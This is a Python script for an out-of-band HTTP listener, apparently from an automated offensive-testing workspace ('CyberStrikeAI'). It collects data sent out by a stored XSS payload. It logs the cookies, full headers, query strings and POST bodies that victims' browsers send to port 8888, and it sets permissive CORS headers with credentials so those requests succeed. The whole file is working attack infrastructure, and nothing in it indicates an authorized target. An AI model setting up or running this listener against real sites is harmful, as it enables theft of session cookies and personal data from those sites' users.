#!/usr/bin/env python3
"""
OOB HTTP listener — receives exfil from Stored XSS payload.

Listens on 0.0.0.0:8888. Logs all GET requests with full path + query + UA + referer.
Also serves a 'hit' page so browser-side execution can be confirmed.

Usage: python3 xss_exfil_listener.py
Output: stdout + xss_exfil.log
"""
import http.server
import socketserver
import socketserver
import urllib.parse
import sys
import os
import datetime
import threading

LOG_FILE = "/opt/CyberStrikeAI/tmp/workspace/projects/cda6ab9b-2296-4103-b1f0-10410de2eca8/xss_exfil.log"

class ExfilHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass  # suppress default stderr noise

    def _record(self, method):
        ts = datetime.datetime.now(datetime.timezone.utc).isoformat()
        path = self.path
        ua = self.headers.get('User-Agent', '')
        ref = self.headers.get('Referer', '')
        origin = self.headers.get('Origin', '')
        cookies = self.headers.get('Cookie', '')
        host = self.headers.get('Host', '')
        line = (f"[{ts}] {method} {host}{path}\n"
                f"    UA: {ua}\n"
                f"    Referer: {ref}\n"
                f"    Origin: {origin}\n"
                f"    Cookie: {cookies[:200]}\n"
                f"    All-Headers: {dict(self.headers)}\n"
                f"    ---")
        print(line, flush=True)
        with open(LOG_FILE, "a") as f:
            f.write(line + "\n")

    def do_GET(self):
        self._record("GET")
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Credentials", "true")
        self.end_headers()
        body = b'<html><body><h1>OK</h1></body></html>'
        self.wfile.write(body)

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', errors='replace') if length else ''
        ts = datetime.datetime.now(datetime.timezone.utc).isoformat()
        ua = self.headers.get('User-Agent', '')
        ref = self.headers.get('Referer', '')
        line = (f"[{ts}] POST {self.path}\n"
                f"    UA: {ua}\n"
                f"    Referer: {ref}\n"
                f"    Body: {body[:1000]}\n"
                f"    ---")
        print(line, flush=True)
        with open(LOG_FILE, "a") as f:
            f.write(line + "\n")
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Credentials", "true")
        self.end_headers()
        self.wfile.write(b'ok')

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Credentials", "true")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "*")
        self.end_headers()


class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


def main():
    port = 8888
    server = ThreadedTCPServer(("0.0.0.0", port), ExfilHandler)
    print(f"[xss_exfil] listening on 0.0.0.0:{port}", flush=True)
    # Truncate log
    open(LOG_FILE, "w").close()
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.shutdown()


if __name__ == "__main__":
    main()